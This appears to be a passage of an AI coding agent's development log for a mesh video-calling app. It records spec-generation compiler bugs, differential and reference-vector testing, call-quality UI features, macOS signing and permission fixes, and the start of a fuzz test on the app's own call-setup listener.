  replaces the decode bounds check, `MAX_FRAME = gen::MAX_PAYLOAD`. Equivalence test
  `spec_frame_geometry_matches_modem` pins Barker len / threshold / MAX_FRAME AND round-trips modulate() to
  `frame_symbols()`. modem 23/23, full lib 167/167. **5/11 files now spec-first** (wire, rti_alert, discovery,
  routing_etx, modem_frame).
- **Tap-to-expand link-quality panel, both platforms** (extends last wave's badge — the report emphasized
  on-device observability of the BWE loop). CallManager/ViewModel keep a rolling 60-sample `bitrateHistory` +
  `jitterHistory` (appended in the existing 1s tick, cleared on endCall). Mac: badge -> `.popover` with
  `LinkStatsPanel` + a minimal `Sparkline` (auto-scales, dashed 40ms threshold line). iOS: badge -> `.sheet`
  (`presentationDetents([.height(240)])` guarded `#available(iOS 16)`) with `iLinkStatsPanel` + `iSparkline`.
  Sparkline is a plain SwiftUI Path in a GeometryReader — no deps.

## WAVE 2026-07-22 #5 — routing feasibility t27 + GCC probe-up + missed-call persistence

- **t27: `routing_etx.t27` gained RFC 8966 §3.7 feasibility** (loop prevention): `is_feasible(new_etx,
  existing_etx, has_existing)` (no incumbent -> true; else `better_route`) + `learn_ok(is_self_route,
  feasible)`. Equivalence test `spec_feasibility_matches_f32` pins them to routing.rs's live f32
  `is_feasible`/`learn_route` (no-incumbent, strictly-better, tie, worse, self-route). routing 19/19, lib
  168/168. **t27c EMITTER BUG found & worked around:** comparing a `bool` param to a bool literal
  (`has_existing == false`) emits `(has_existing as u32) == false` which won't compile. Use **u32 0/1 flags**
  for any bool that gets COMPARED (a bool that's only RETURNED, like `feasible`, is fine). Same class as the
  `as u32` cast drift noted in wire.rs.
- **GCC probe-up (2nd half of GCC), both platforms:** the BWE handler backed off on high jitter but never
  probed UP. Now peer jitter `< 20ms` for 3 consecutive reports -> an EXTRA `nudgeBitrate(down:false)` climb
  tick — on the REAL video stream, NEVER padding bursts (CLAUDE.md: the mesh pacing is fragile, a burst hits
  the fragmentation path). Overshoot is caught instantly by the existing `> 40ms` back-off. `cleanStreak`
  resets on any non-clean report and on endCall. The new link-stats sparkline visualizes the faster reclimb.
- **Missed-call persistence, both platforms:** `MissedCall` is now `Codable`; `missedCalls` loads from
  UserDefaults (`trinetMissedCalls`, JSON) at init and a `didSet` re-persists on every change. `id` changed
  `let`->`var` for Codable. VERIFIED end-to-end on Mac: unanswered INVITE -> 40s auto-miss -> JSON round-trips
  through UserDefaults (`defaults export` showed the decoded record). Test artifact cleared afterward.

## WAVE 2026-07-22 #6 — t27c emitter CEILING found + call-history journal

- **The golden-pipeline migration has a hard CEILING at 6/11, and it's the FROZEN compiler.** Two t27c
  gen-rust emitter bugs, both CONFIRMED with minimal repros (docs/T27C_EMITTER_BUGS.md):
  1. **bool compared to a bool literal** -> `(x as u32) == false` (won't compile). Workaround: u32 0/1 flags.
  2. **u64 comparison operands TRUNCATED to u32** -> `(a as u32) > (b as u32)`; `big_gt(2^40, 2^40-1)` decides
     `false`. SILENT and wrong for any operand >= 2^32. `cmp_operand_as_u32` promotes unconditionally to u32.
  Both live in `../t27/bootstrap/src/compiler.rs` which is **FROZEN (FROZEN_HASH seal, build.rs verifies)** —
  cannot be fixed from tri-net, needs an upstream fix + deliberate re-seal. **DO NOT lift u64 (crypto replay
  window, counters) or bool-compare logic until fixed** — gen output is silently wrong. Verified the existing
  6 specs are SAFE (u32/usize, values << 2^32); the one u64 gen fn `discovery::is_fresh` is DEAD (not wired),
  so nothing ships wrong. This is why `crypto.rs` was NOT lifted this wave — shipping on a broken tool violates
  the debugging doctrine. Filing the upstream issue is an outward action; left for the user (documented).
- **Call-history journal, both platforms:** `CallRecord{peer, at, durationSec, avgKbps, avgJitterMs}` (Codable,
  persisted under `trinetRecentCalls`). `callStartedAt` stamped at startCall; endCall/stopCall journals a
  record IFF frames flowed (real call, not a failed dial), computing duration + averages from the
  bitrate/jitter history BEFORE it is reset. Start screen shows the last 4 as "peer · 3m12s · 512k · 18ms"
  (red if avg jitter > 40) with a one-tap Call. Same proven UserDefaults Codable path as missedCalls (that
  round-trip was verified live last wave); the record itself needs a real 2-endpoint call to populate.

## WAVE 2026-07-22 #7 — router_ttl.t27 (u32-safe lane) + call-journal export

- **t27 wave 7: `specs/router_ttl.t27`** — continues the migration in the U32-SAFE LANE (deliberately dodging
  both emitter bugs: all values <= 8, and has_route is a u32 0/1 flag). Lifts router.rs's hop-by-hop
  forwarding decision (`is_for_me` / `is_expired` / no-route / `is_split_horizon` / forward) + `next_ttl`
  (ttl-1) + a combined `forward_decision` returning DECIDE_{LOCAL,DROP_TTL,DROP_NOROUTE,DROP_SPLIT,FORWARD}.
  WIRED into router.rs forward() (the 4 predicates + `DEFAULT_TTL = gen::DEFAULT_TTL as u8` + `next_ttl`).
  Equivalence test `spec_forward_decision_matches_wired_gates` sweeps the full input table; CRUCIALLY the
  pre-existing BEHAVIORAL tests `ttl_expiry_is_dropped` + `ttl_decrements_across_two_hop_relay` (which drive
  forward() through real sealed frames) still pass -> the wiring preserved end-to-end behavior. router 27/27,
  lib 169/169. **7/11 files spec-first.** (u64 files crypto/gf16/rti still blocked on the frozen-compiler
  emitter bugs — see docs/T27C_EMITTER_BUGS.md.)
- **Call-journal export, both platforms:** `callJournalText` = TSV (peer, ISO8601 start, duration_s, avg_kbps,
  avg_jitter_ms). Mac: "Copy log" button -> NSPasteboard. iOS: `ShareLink(item:)` (iOS 16+ guarded). For the
  link-quality diagnostics use case from the market report — the user can paste/share the journal.

## WAVE 2026-07-22 #8 — mid-call link-health banner (make the freeze visible)

- **Weak-spot correction:** the candidate "RTI presence detector is unverified" was WRONG — rti.rs already has
  `detect_single_blob_one_person`, `detect_two_blobs_two_people`, `detect_no_blobs_empty_field`, kalman
  tracking (17 tests). Don't re-test it. Also note: t27 targets Rust/C/Zig, NOT Swift — the phone app's logic
  can't be lifted to a spec, so t27 waves only apply to src/*.rs.
- **Mid-call link-health banner, both platforms** (debugging doctrine: make the silent failure VISIBLE). Before,
  a degraded/lost link just froze the last frame with no signal. Now `LinkHealth.classify(framesFlowed,
  msSinceLastFrame, jitterMs, stallMs=5000, weakJitterMs=40)` -> good/weak/stalled, evaluated in the existing
  1s BWE tick off `lastVideoArrival`: once frames have flowed, no frame for >5s => "Reconnecting…" (red tag),
  sustained peer jitter >40ms => "Weak connection" (amber tag). `framesFlowed=false` (a dialing call) is always
  good — a ring isn't "weak". Reset on endCall/stopCall. The classifier is a PURE static func VERIFIED by a
  standalone swiftc harness (7/7 truth-table: no-frames, healthy, high-jitter, both thresholds exact, stalled,
  stalled-beats-weak) — the project's Swift-logic verification pattern. Live wiring build-verified; the actual
  end-to-end stall still needs a real 2-endpoint call.

## WAVE 2026-07-22 #9 — stall AUTO-RECOVERY (act, not just show) + restored flash

- **The banner from #8 only SHOWED the stall — now it ACTS.** On `.stalled`, `evalLinkHealth` sends a PLI
  (`[0xFC 0x00]`, keyframe-request) to the peer, rate-limited to once / 2s. Rationale: a stall means NO packets
  are arriving, so the DECODER's own `onKeyframeNeeded` (VideoToolbox, fires when it's fed an undecodable
  frame) can NEVER fire — the decoder isn't being fed at all. So the receiver must PROACTIVELY ask the
  still-alive peer for a fresh IDR, so the first frame after the link returns is decodable (an IDR) instead of
  a P-frame referencing a lost anchor (which the decoder drops, extending the black screen). Both platforms.
- **"Connection restored" green flash** on `stalled -> good` transition (2s, symmetric to the red banner) —
  the user sees recovery, not just the trouble.
- **Verified:** the rate-limit decision is a pure static `LinkHealth.shouldRequestKeyframe(health,
  msSinceLastRecovery, cooldownMs=2000)` — swiftc harness 6/6 (good/weak never ask; stalled first-time asks;
  after-cooldown asks; within-cooldown + at-boundary suppressed). Both apps build; Mac deployed. The PLI
  actually reaching a peer + faster recovery needs a real 2-endpoint call.

## WAVE 2026-07-22 #10 — seq-partition non-overlap PROOF + stall count in journal

- **video_bridge.t27 already had video_seq/express_seq (construction); it was MISSING the receive-side
  classifiers + a proof of the property the design's safety rests on.** Added `is_express(seq)` /
  `is_video(seq)` (u16 `>=`/`<` — the emitter's `as u32` widening is LOSSLESS for u16, safe) + 5 t27 tests +
  an invariant `seq_partition_at_midpoint`. Then a RUST integration test in tests/generated_modules.rs sweeps
  ALL 65536 counters proving: video_seq always in [0,32767], express_seq always in [32768,65535], the two are
  NEVER equal, and the classifiers round-trip. This machine-checks the exact splice hazard CLAUDE.md warns
  about (one reassembly map, two seq producers). generated_modules 108, lib 169/169. Note: the receiver
  currently doesn't call is_express (one map, delivered to one socket) — the classifiers are the SSOT+proof;
  wiring them is only needed if a future receiver routes by class.
- **Stall count in the call journal, both platforms:** `CallRecord.stalls` counts stalled transitions per call
  (incremented in evalLinkHealth on good/weak->stalled), shown as "· ⚠︎N" in recents (red) and added to the
  TSV export. **Codable pitfall caught + fixed:** synthesized Swift Codable does NOT apply a property default
  for a MISSING key — `var stalls = 0` would THROW on old records and `try?` would drop the WHOLE journal.
  Fixed with a custom `init(from:)` using `decodeIfPresent(..) ?? 0` (+ kept the memberwise init). VERIFIED by
  a swiftc harness: an old-format JSON record (no "stalls" key) decodes with stalls=0; a new record
  round-trips stalls=3. This is the general rule for evolving any persisted Codable in this app.

## WAVE 2026-07-22 #11 — gen/spec audit (clean) + ESCALATING stall recovery

- **gen/spec coverage audit:** every one of the 115 `gen/rust/*.rs` modules has a matching `specs/*.t27` (115 =
  115, zero orphans) — the golden pipeline's gen side is fully spec-backed. (The "N/11 spec-first" tracker is a
  separate thing — the HAND-WRITTEN src/*.rs business-logic files; the u64 ones stay blocked on the emitter.)
  So "uncovered gen modules" was an empty lane — pivoted.
- **Escalating stall recovery, both platforms:** #9 asked for a keyframe every 2s while stalled; now a
  PROLONGED stall (>10s continuous) escalates — `LinkHealth.recoveryPlan(health, msSinceLastRecovery,
  msStalledContinuously, baseCooldownMs=2000, prolongedMs=10000)` returns `{requestKeyframe, dropToFloor}`:
  cadence halves to 1s AND (when it fires) `camera.nudgeBitrate(down:)` drives the encoder toward its floor,
  trading resolution for a better chance of punching an IDR through a bad channel. `stalledSince` tracks the
  CURRENT continuous stall (reset when leaving stalled + on endCall). Replaces the old `shouldRequestKeyframe`.
  VERIFIED by swiftc harness 9/9 (good/weak do nothing; short-stall first/after-2s/within-2s; prolonged
  first/after-1s/within-1s asks + floor; the 10s boundary is strictly-greater so not-yet-prolonged). Both
  build; Mac deployed. Actual reach improvement needs a real bad-link 2-endpoint call.

## WAVE 2026-07-22 #12 — reference-vector tests for gen modules (self-consistent != correct)

- **Weak spot: many gen-module tests in tests/generated_modules.rs are SELF-CONSISTENT ONLY** (deterministic /
  round-trip / verify-accepts-own-output). Those would ALL pass even if the emitter produced subtly wrong
  output (wrong shift/mask/truncation), because getter and setter share the same bug. A test that only checks
  code against itself proves nothing about INTEROPERABILITY. This is the exact class the u64/bool emitter bugs
  live in — so unverified-against-reference gen output is a real risk.
- **Fix: pin correctness-critical gen output to INDEPENDENT reference vectors.**
  - `crc16`: computed CRC-16/CCITT (init 0xFFFF, poly 0x1021, MSB-first shift, LSB-first input bits) in a
    separate Python impl; asserted `crc16_4bytes` == {0x7663, 0x2C58, 0x84C0, 0x1D0F} for 4 inputs. MATCHES —
    the spec-first CRC is correct + interoperable, u16 arithmetic survived the emitter.
  - `network_coding`: pinned the ABSOLUTE packed wire layout `create_packet(11,22,0xAB,7)==0x0B16AB07`,
    `create_coded_packet(0xF,0xAB,0xCD,0x123)==0xFABCD123`, and bit-exact XOR — a mis-shifted layout would pass
    the round-trip test but fail these. MATCHES.
  generated_modules 108 -> 110, lib 169/169, full suite green. Rust-only wave (no app changes). GENERAL RULE:
  when adding a gen-module test, at least one assertion must pin an ABSOLUTE value from an independent oracle,
  not just round-trip the generated code against itself.

## WAVE 2026-07-22 #13 — call-stability summary (aggregate over the journal)

- **Stability summary, both platforms:** under the recent-call journal, an aggregate row "N calls · avg
  <dur> · <kbps>k · <totalStalls> stalls" (red when any stalls) gives one glance at overall link quality
  instead of per-call rows only. Pure `CallStats.summarize(durations, stalls, kbps)` — integer means +
  stall total, empty => all zeros. Exposed as a computed `callStats` over recentCalls. VERIFIED by a swiftc
  harness 4/4 (empty->zeros, single, three-means-and-total, integer-truncation of the mean). Both build; Mac
  deployed. Populates from real completed calls (needs a 2-endpoint call).

## WAVE 2026-07-22 #14 — reference-vector tests for 3 more state-machine gen modules

- Extended the #12 pattern (pin ABSOLUTE values vs an independent oracle, not self-round-trip) to three more
  correctness-critical bit-packed gen modules whose existing tests were round-trip/isolation only:
  - `packet_queue`: state `[tail:3][head:3][count @6]` — `enqueue(0)==0x48`, `enqueue(enqueue(0))==0x90`,
    `increment_index(3)==4`, `(7)==0`.
  - `congestion_control`: `[cwnd:8 @24][ssthresh:8 @16][state:2 @14][losses:14]` —
    `create(200,100,1,3)==0xC8644003`, `create(0xAB,0xCD,2,0x1234)==0xABCD9234`, 14-bit loss field holds
    0x3FFF, 2-bit state holds 3.
  - `flow_control`: `[sender:4 @28][receiver:4 @24][window:8 @16][credits:8]` — `create(5,10,8,5)==0x5A080005`,
    `create(0xF,0xA,0xBC,0xDE)==0xFABC00DE`, `consume_credit` takes exactly 1 off the low byte (0xDE->0xDD)
    leaving the other fields intact.
  All MATCH -> the spec-first layouts are interoperable; the emitter didn't corrupt these u32 packings.
  generated_modules 110 -> 113, lib 169/169. Rust-only wave.

## WAVE 2026-07-22 #15 — systematic self-consistent-test audit + security/FEC absolute pins

- **Audit:** scanned every gen module with a `create_/pack_/encode_` packer for whether ANY test pins an
  ABSOLUTE value vs only round-tripping getters. Found ~20 TESTED modules with **abs_pins=0** (round-trip
  only) — a whole class where a mis-shifted layout would pass every test. Closed the highest-value ones:
  - `access_control` (SECURITY): `create_node_creds(0xAB,3,0x2CD,1)==0xABECD800`,
    `create_policy(0xF,3,1,0,1)==0xFE800000`.
  - `trust_manager` (SECURITY): `create_trust_score(0xAB,0xCD,0xEF,0x12)==0xABCDEF12`.
  - `pq_hybrid` (SECURITY, u64): `pack_initiator_msg(0xAABBCCDD,0x11223344)==0xAABBCCDD11223344u64` — proves
    the emitter's u64 SHIFT/OR is correct (only u64 COMPARISON is buggy, per T27C_EMITTER_BUGS.md).
  - `rlnc_coding` (FEC): pinned `gf_mul(0x53,0xCA)==0x01` — the KNOWN AES GF(256) inverse pair (poly 0x11B), an
    EXTERNAL vector proving the field itself is correct; + `encode_symbol` dot-product + `batch_header` layout.
  All MATCH. generated_modules 113 -> 116, lib 169/169.
  BACKLOG (tested, still abs_pins=0): anomaly_detector, adaptive_routing, olsr_routing, multipath_routing,
  cache_management, frame_buffer, health_monitoring, quarantine_manager, tri_contract, tri_spora, and ~40
  UNTESTED packers (api_documenter, emergency_alert, key_management, ...). Same recipe applies.

## CHAT unread badge + SCREEN-SHARE revert-on-fail — 2026-07-20

- **Chat badge:** `@Published var unreadChat` + `var chatOpen { didSet { if chatOpen { unreadChat = 0 } } }`
  on CallManager/StreamViewModel. Increment on an incoming `who: .them` message only when `!chatOpen`; the view
  wires `chatOpen` on open/close and draws a red count capsule on the chat icon when `unreadChat > 0 && !showChat`.
- **Screen-share "doesn't work" = a permission failure that left a BLACK call.** `toggleScreenShare` set
  `isScreenSharing = true` synchronously (which SUPPRESSES the camera), but `ScreenCapture.start()` is async and
  THROWS when Screen Recording isn't granted — so the camera was muted AND no screen frames flowed. Fix:
  `ScreenCapture.onStarted(ok, msg)` reports back on the main queue; on failure CallManager sets
  `isScreenSharing = false` (camera resumes) + a user-visible `status`. macOS gotcha surfaced in the message:
  once you grant Screen Recording you MUST RESTART the app (ScreenCaptureKit caches the denial per process).
  Also added `cfg.showsCursor = true` and a `screen frame #N` log. Can't be verified headlessly (needs the TCC
  grant + a call).
- **Screen-share REAL bug (permission was already granted): the frame-status filter dropped EVERY frame.** The
  SCStreamOutput did `guard … status == .complete else { return }`, casting the sample-buffer attachments to
  `[[SCStreamFrameInfo: Any]]`. On macOS 26 that cast / status read fails, so the guard returned on every frame
  → nothing encoded, black call, no error. Fix: INVERT it — skip ONLY frames we can positively read as
  not-`.complete`/`.started`; if the attachment can't be read, ENCODE anyway. Plus `screen NAL #N` logging to
  trace frame -> encode -> NAL -> transport. Lesson: never let a fragile OS-attachment cast gate the whole
  data path with a fail-closed `guard`.
- **Distinctive incoming ring = a SYNTHESIZED tri-tone** (`RingSynth`, embedded on both platforms): three
  ascending chirps E5-B5-E6 + a 0.55s gap, generated into an `AVAudioPCMBuffer` and looped via
  `AVAudioPlayerNode` — not a stock alert sound, so it's instantly recognizable as TRI-NET. iOS sets the
  session to `.playback`+`.mixWithOthers` so it sounds while ringing; both `stop()` on accept/decline/timeout.
  Verified AUDIBLE (RMS 0.107, not silence) by regenerating the same math to a WAV and playing it.
- **THE screen-share root cause: AD-HOC signing reset the TCC grant on EVERY rebuild.** The Mac app was
  `CODE_SIGN_IDENTITY: "-"` (ad-hoc), so its cdhash changed each build; macOS TCC identifies an ad-hoc app BY
  cdhash, so every rebuild/redeploy looked like a NEW app and the Screen Recording grant reset — the user saw
  the app "ON" in Settings (for the OLD cdhash) yet got re-prompted forever. FIX: sign with the stable
  **Apple Development** identity (Team `5EM4M85VSQ`, from `security find-identity -v -p codesigning`) — TCC then
  keys off Team-ID + bundle-ID (a stable Designated Requirement), so the grant PERSISTS across rebuilds. The app
  has NO entitlements/sandbox, so Development signing needs no provisioning profile. Set in
  `desktop/project.yml` (base AND target settings): `CODE_SIGN_IDENTITY: "Apple Development"`,
  `CODE_SIGN_STYLE: Manual`, `DEVELOPMENT_TEAM: "5EM4M85VSQ"`, `CODE_SIGNING_REQUIRED: YES`; `xcodegen generate`
  then build — verified `Authority=Apple Development…`, `TeamIdentifier=5EM4M85VSQ`. The user grants Screen
  Recording ONE more time (remove the stale ad-hoc entry, re-grant for the new signature, restart the app) and
  it stays granted through all future updates. Lesson: any TCC-gated feature (screen/camera/mic/AX) needs a
  STABLE signature or the permission churns every build.
- **`-3801 "user declined TCCs"` after re-signing = a STALE TCC decision, not a real denial.** The old ad-hoc
  grant is recorded against the old signature; the new Development signature doesn't match, so SCK returns
  declined WITHOUT re-prompting. Clear it with `tccutil reset ScreenCapture com.trinet.monitor` — the next
  attempt prompts fresh, and (being stably signed now) the grant sticks. The app also opens the pane on
  failure: `NSWorkspace.shared.open(URL("x-apple.systempreferences:com.apple.preference.security?Privacy_ScreenCapture"))`
  (needs `import AppKit`).

## CHAT chime + iOS ORIENTATION — 2026-07-20

- **Chat blip (Trinity-style):** `ChatChime` (embedded both platforms) synthesizes a quick C6->G6 two-note chirp
  ONCE into a CAF (AVAudioFile, Int16 PCM) and plays via `AudioServicesCreateSystemSoundID` +
  `AudioServicesPlaySystemSound`. Chosen over AVAudioEngine specifically because it is SESSION-SAFE — it never
  touches the call's AVAudioEngine, so it can't trigger the config-change that kills the mic (see media
  invariants). Fired on every incoming `who: .them` message. Verified AUDIBLE (RMS 0.150).
- **iOS orientation / fullscreen:** the app was Portrait-only. Added LandscapeLeft/Right to
  `TriNetVideo/Info.plist` (the build reads that file directly — NO xcodegen regen needed, which the static-file
  rule forbids) AND to `phone/project.yml` (so a future regen keeps it). Now rotating the device fills the
  screen. Also a fullscreen button in the call top bar forces landscape via
  `UIWindowScene.requestGeometryUpdate(.iOS(interfaceOrientations:))` (iOS 16+); resets to portrait on
  `CallScreen.onDisappear` so the home screen isn't stuck landscape.
- **Self-preview PiP must rotate with the device too** (user: the right-hand preview was sideways in
  landscape). The CAPTURE connection is pinned upright via `videoRotationAngleForHorizonLevelCapture` (so the
  PEER always reads a level picture) — that must NOT change. Fix the PREVIEW connection separately in
  `PreviewView`: an `AVCaptureDevice.RotationCoordinator` bound to the PREVIEW LAYER, set the layer connection's
  `videoRotationAngle = videoRotationAngleForHorizonLevelPreview`, and KVO-observe that property to update live
  as the phone turns (iOS 17+; retains the coordinator + observation). Two DIFFERENT connections, two different
  angles — don't conflate capture-upright with preview-follows-device.

phi^2 + phi^-2 = 3 | TRINITY

## WAVE 2026-07-22 #6 — crypto_frame.t27 + a t27c CODEGEN BUG the diff-harness caught

- **THE FINDING (important): t27c-0.1.0 has 32-bit-only comparison/mask codegen.** It emits integer compare
  and mask operands wrapped in `as u32`, and types the literal `1` in `1 << n` as i32. For anything wider than
  32 bits this MISCOMPILES: `(bitmap & (1 << 34)) as u32` truncates window bits 32..63 to zero, and `1i32 << 34`
  wraps the shift to `34 & 31 = 2`. A 64-bit replay bitmap lifted to t27 would read a frame at distance 34 as
  FRESH when it is a REPLAY — a silent security hole. This affects ANY future spec doing >32-bit masks/compares
  (crypto counters, large bitfields, u64 flag sets). Workaround: split into <=32-bit lanes, or wait for
  64-bit-clean codegen upstream (gHashTag/t27).
- **HOW IT WAS CAUGHT — always differential-test a generated spec against the source, do NOT trust typecheck.**
  crypto_frame.t27 typechecked 0/0 and generated clean Rust that COMPILED — but `scratchpad/crypto_frame_diff.rs`
  drove the generated `replay_accept/next_bitmap` and an exact copy of src/crypto.rs's `ReplayWindow` through
  2000 shared pseudo-random counters and diverged at step 37 (ctr 78, distance 34): spec said accept, source
  said replay. Typecheck proves types; only a differential harness proves SEMANTICS survive codegen. For any
  crypto/wire spec this harness is mandatory, not optional.
- **HONEST OUTCOME:** dropped the replay-window functions from crypto_frame.t27 (they can't be generated
  correctly) with a prominent NOTE; the window stays hand-written in src/crypto.rs. KEPT and re-verified
  bit-identical: nonce layout `[dir][epoch:4 BE][ctr low 7 BE]`, frame geometry (12B header/offsets/gate),
  rekey thresholds (2^20 ratchet / 2^24 hard cap), rx_dir. Full `cargo test --lib` still 169/169.
- Do NOT "fix" this by wiring the miscompiled version anyway because it typechecks — that is exactly the
  fabrication trap. A green typecheck on a security function is necessary, never sufficient.

## WAVE 2026-07-22 #7 — replay window RECLAIMED for t27 (lane-split, RFC 6479 style)

- **The t27c 32-bit codegen bug is DODGEABLE, not fatal: split the >32-bit value into u32 LANES.** The 64-bit
  replay bitmap is now carried in crypto_frame.t27 as two u32 halves (blo=bits0..31, bhi=bits32..63). Every
  shift amount is forced < 32 and every mask fits one lane, so t27c's `as u32` wrap becomes a no-op instead of
  a truncation. The security-critical anti-replay window is now spec-first (the golden pipeline finally covers
  the most sensitive function), NOT hand-waved away.
- **The exact miscompile, corrected understanding:** the killer was the OUTER `as u32`, not the shift. u64:
  `(bitmap & (1u64 << 34)) as u32` — the AND result 2^34 truncates to 0. Lane: `(blo & (1 << d)) as u32` with
  blo:u32 and d<32 — the AND result already fits u32, so the cast is harmless. (The literal `1` is inferred to
  match the u32 operand, so `1 << 31` is fine too.) Rule: keep every masked/compared value <= 32 bits and
  t27c-0.1.0 is exact.
- **64-bit shift across two lanes (forward jump s in 1..63):** new_lo=(blo<<s)|1 for s<32 else 1; new_hi for
  s<32 = (bhi<<s)|(blo>>(32-s)), for s>=32 = blo<<(s-32), for s>=64 = 0. Verified against the u64
  `(bitmap<<shift)|1` by the differential harness — 8 seeds x 5000 clustered counters, comparing accept AND the
  recombined `(blo|(bhi<<32))` to the real u64 bitmap. Reuse this lane pattern for any future >32-bit spec math.
- Wiring into src/crypto.rs still waits on the L6 hook policy (same as the other lifted specs); the window stays
  runtime-active as the hand-written u64 version, now with a proven-equivalent spec beside it.

## WAVE 2026-07-22 #8 — AUDIT of already-wired specs catches a latent u32 overflow

- **Insight: typecheck-passes-and-compiles is NOT proof for ALREADY-WIRED specs either.** Turned the crypto
  finding into an audit of the live wired specs. routing_etx.t27 (wired at src/routing.rs:18) is the most
  arithmetic-heavy, so it went first: a full-domain differential harness (scratchpad/etx_overflow_audit.rs)
  compared gen::etx_milli against a u64 reference.
- **Realistic domain CLEAN, but a latent overflow found.** For delivery ratios 0.15..1.0 and penalty <= 10x
  (the documented range) — 273652 checks, 0 mismatches: the live metric is correct today. BUT `base *
  penalty_milli` is a u32 multiply and `set_penalty` has NO upper clamp (`penalty.max(1.0)` only), so a penalty
  above ~96000 milli WRAPS: worst base 44444 * 100000 = 4.44e9 > 2^32 -> gen returned 149432 (tiny) instead of
  4.44e6. A wrapped-tiny ETX makes a heavily-obstructed link read as a GREAT route -> routing black-hole. The
  live f32 path in src/routing.rs does NOT wrap (float), so no runtime bug TODAY, but the fixed-point form
  would be a real hole once wired.
- **FIX (minimal, physical): clamp the penalty to 32x in the spec.** `PENALTY_MAX_MILLI = 32000`; a link 32x
  worse than clear is already "avoid entirely", so no realistic decision changes, and 44444*32000=1.42e9 stays
  in u32 with margin. Re-audited over the FULL domain (7.31M checks, penalties 1x..1000x): 0 mismatches, output
  stable at 1422208 for runaway penalties, never wraps. When routing_etx is wired, src/routing.rs set_penalty
  should gain a matching `.min(32.0)` so the point-by-point equivalence holds at high penalties.
- **Lesson for every wired spec doing multiply/shift: sweep the FULL input domain against a u64 reference, not
  just the happy path.** u32 overflow hides above the realistic range and only a domain sweep finds it. Audit
  the other wired arithmetic specs (modem_frame frame-length math, gf16 field ops) the same way next.

## WAVE 2026-07-22 #9 — audit sweep of remaining wired arithmetic specs (both CLEAN)

- **modem_frame.t27 (wired src/modem.rs) — CLEAN over the realistic domain (2.13M checks, 0 mismatches).** The
  one `as u32` truncation point is `decode_fits`'s `(sym_start + out_len*8) as u32 <= total`. It DOES truncate
  at sym_start=2^32 (gen=true vs ref=false, demonstrated), but is UNREACHABLE by construction: a max frame is
  frame_symbols(255)=2061 symbols, so indices never approach 2^32. Added a spec NOTE documenting the bound;
  no code fix (contrast routing_etx, whose penalty had NO bound and WAS reachable -> needed a clamp). The
  distinction to record for each `as u32` site: is the operand bounded by construction (safe) or unbounded
  (reachable -> must clamp)?
- **gf16_format.t27 (spec-only) — proven EXHAUSTIVELY.** All 65536 u16 bit patterns x 6 field/classifier
  functions (393216 checks) + all 65536 compose(sign,exp,mant) roundtrips: 0 mismatches. Bit-field ops stay
  <=16 bits so the u32 codegen is always exact. Exhaustive proof is cheap for <=16-bit domains; prefer it over
  sampling when the domain fits in a u32 loop.
- **Audit status of all wired arithmetic specs: DONE.** wire (BE bytes), routing_etx (overflow found+clamped),
  rti_alert, discovery (gates), modem_frame (clean), router_ttl, gf16 (exhaustive). Only routing_etx needed a
  fix; the rest are safe because their operands are bounded (<=16 bits or by frame/counter caps). The
  differential/exhaustive harness is now the standard gate for any spec touching multiply/shift/mask before it
  is trusted, wired or not.

## WAVE 2026-07-22 #10 — LIVE test caught a group-call teardown bug (UDP+ICMP)

- **Grounding back in the product after 6 theory waves immediately paid off.** A sustained loopback call was
  observed to die at ~15s. Root cause (isolated by re-running with all-reachable vs unreachable peers): the BSD
  recv loop did `if n <= 0 { break }` on recvfrom. A previous `sendto` to an UNREACHABLE peer delivers its ICMP
  error (EHOSTDOWN/ECONNREFUSED/ENETUNREACH) on the NEXT `recvfrom` as n<0 -> the loop broke -> the ENTIRE call
  ended. One dead group participant killed the whole conference; a 1-1 peer not-yet-bound at startup could too.
- **Fix (both platforms, the recv loop is shared by 1-1 and group):** on n<0 inspect errno — EINTR / EHOSTDOWN /
  ECONNREFUSED / ENETUNREACH / EHOSTUNREACH / EAGAIN / EWOULDBLOCK are TRANSIENT -> `continue`; only a closed
  socket (EBADF when running->false) breaks. Also n==0 is a zero-length UDP datagram (UDP has no EOF) ->
  continue, don't break.
- **VERIFIED LIVE, before/after, one variable:** unreachable-peer loopback died at 15s (1 EHOSTDOWN -> teardown)
  BEFORE; AFTER the fix the same test survived 78s through 51 EHOSTDOWN errors (27 steady BWE probe-ups). The
  all-reachable control sustained both times.
- **Also learned about the adaptive loop from the same test:** on a clean loopback the encoder correctly PINS to
  the 900k non-mesh ceiling + 720p top rung (probe-up fires, 0 back-offs). Loopback starts AT the ceiling and
  has no loss, so it verifies only the "good link" arm; the climb-from-low and loss back-off arms remain
  harness-only (can't induce loss on loopback). Honest coverage note, not a bug.

## WAVE 2026-07-22 #11 — BWE back-off arm VERIFIED via closed-loop harness (+ slow-recovery finding)

- **Closed the one unverified arm of the adaptive-bitrate loop.** Live loopback only exercises the "good link"
  arm (starts at the 900k ceiling, no loss). Inducing real loss needs pfctl/dnctl dummynet = sudo + a system
  firewall change -> NOT done autonomously. Instead built a closed-loop harness (scratchpad/
  bwe_closed_loop_harness.swift) with the EXACT constants (jitter EMA /16, >40ms x2 back-off, <20ms x3 probe-up,
  0.92 down / escalating 8k->64k up, floor 80k, ceiling 900k) and an explicit bottleneck model, then ran the
  canonical GCC bandwidth-step test (capacity 900k->400k->900k).
- **VERIFIED: the loop is stable and correct.** On congestion it backs off 900k->502k, settling exactly at the
  knee where jitter ~ 40ms (the threshold) — textbook AIMD, no collapse to floor, no oscillation. After relief
  it fully recovers to 900k (no deadlock). So the back-off + recovery path, previously harness-only for the STEP
  math, is now verified as a closed LOOP.
- **FINDING (not a bug): recovery is SLOW — 26s to regain full rate** after congestion clears, because probe-up
  climbs only once per 3 clean reports (`cleanStreak >= 3`) ~= once per 3s. Stable but conservative; WebRTC GCC
  recovers in a few seconds. Left UNCHANGED this wave: retuning a verified-stable control loop changes call
  quality (user should sign off) and touches CallManager/ViewModel that the parallel Codex session edits. The
  harness now exists to prove any retune (e.g. gate 3->2) keeps stability — do that behind a user OK.
- **Pattern: when live loss-injection needs root, a constants-exact closed-loop harness with an explicit link
  model verifies control-loop DYNAMICS (convergence, stability, recovery) that step-math tests can't.**

## WAVE 2026-07-22 #12 — fuzzed the plaintext INVITE listener (:7000), no crash

- **Attack surface: the idle INVITE listener on :7000 parses UNAUTHENTICATED datagrams from any LAN host**
  (call setup is plaintext by design, before crypto). Fuzzed it live with 56 adversarial datagrams x scenarios:
  empty / 1-byte / magic-only / no-newline / invalid-UTF8 / 2000B oversize (buf is 512 -> truncated) /
  200-fake-IPs (auto-join flood) / only-newlines / empty-fields / 400B name / NUL bytes / trailing commas /
